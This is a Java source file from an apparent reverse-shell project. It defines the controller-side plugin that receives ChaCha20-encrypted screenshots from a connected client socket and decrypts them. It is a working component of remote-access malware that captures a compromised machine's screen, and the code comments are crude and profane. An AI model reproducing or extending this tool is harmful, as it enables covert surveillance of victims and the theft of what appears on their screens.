package obs1d1anc1ph3r.reverseshell.server.plugins.reactive;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.net.Socket;
import obs1d1anc1ph3r.reverseshell.server.encryption.ChaCha20Server;
import obs1d1anc1ph3r.reverseshell.server.plugins.reactive.utils.ReceiveScreenShot;
import obs1d1anc1ph3r.reverseshell.server.plugins.reactive.utils.ReactiveCommandPlugin;

public class ScreenshotServerCommand implements ReactiveCommandPlugin {

    private final ReceiveScreenShot screenshotHandler = new ReceiveScreenShot();

    @Override
    public void execute(DataInputStream dataIn, DataOutputStream dataOut, byte[] encryptionKey, Socket clientSocket) throws Exception {
        int length = dataIn.readInt(); //Data length
        if (length <= 12) {
            System.err.println("[ERROR] Invalid screenshot data length."); //Fuck your byte
            return;
        }

        byte[] receivedNonce = new byte[12]; //I don't wanna do that :(
        dataIn.readFully(receivedNonce); // FUCK D:

        byte[] encryptedImageBytes = new byte[length - 12]; //Oooooo encrypted
        dataIn.readFully(encryptedImageBytes); //Fancy

        byte[] imageBytes = ChaCha20Server.decrypt(encryptionKey, receivedNonce, encryptedImageBytes); //Wow, such decrypted

        screenshotHandler.receiveScreenshotData(imageBytes); //Yeah, I don't wanna deal with this anymore
    }
}
